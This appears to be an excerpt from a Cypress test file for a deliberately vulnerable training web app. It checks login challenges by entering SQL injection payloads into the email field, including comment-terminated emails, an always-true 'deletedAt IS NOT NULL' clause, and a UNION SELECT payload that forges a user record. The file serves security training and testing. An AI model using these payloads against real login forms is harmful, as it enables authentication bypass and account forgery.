describe('/#/login', () => {
  ...
  describe('challenge "loginAdminChallenge"', () => {
    ...
    it('should log in Admin with SQLI attack on email field using "admin@<portfolio-tracker.example>\'--"', () => {
  ...
  describe('challenge "loginJimChallenge"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<portfolio-tracker.example>\'--"', () => {
      cy.task<string>('GetFromConfig', 'application.domain').then(
        (appDomain: string) => {
  ...
  describe('challenge "loginBenderChallenge"', () => {
    it('should log in Bender with SQLI attack on email field using "bender@<portfolio-tracker.example>\'--"', () => {
      cy.task<string>('GetFromConfig', 'application.domain').then(
        (appDomain: string) => {
  ...
  describe('challenge "ghostLoginChallenge"', () => {
    it('should be able to log in as chris.pike@portfolio-tracker.example by using "\' or deletedAt IS NOT NULL --"', () => {
      cy.get('#email').type("' or deletedAt IS NOT NULL--")
      cy.get('#password').type('a')
      cy.get('#loginButton').click()
    })

    it('should be able to log in as chris.pike@portfolio-tracker.example by using "chris.pike@portfolio-tracker.example\' --"', () => {
      cy.task<string>('GetFromConfig', 'application.domain').then(
        (appDomain: string) => {
  ...
  describe('challenge "ephemeralAccountant"', () => {
    it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
      cy.get('#email').type(
        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@portfolio-tracker.example' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
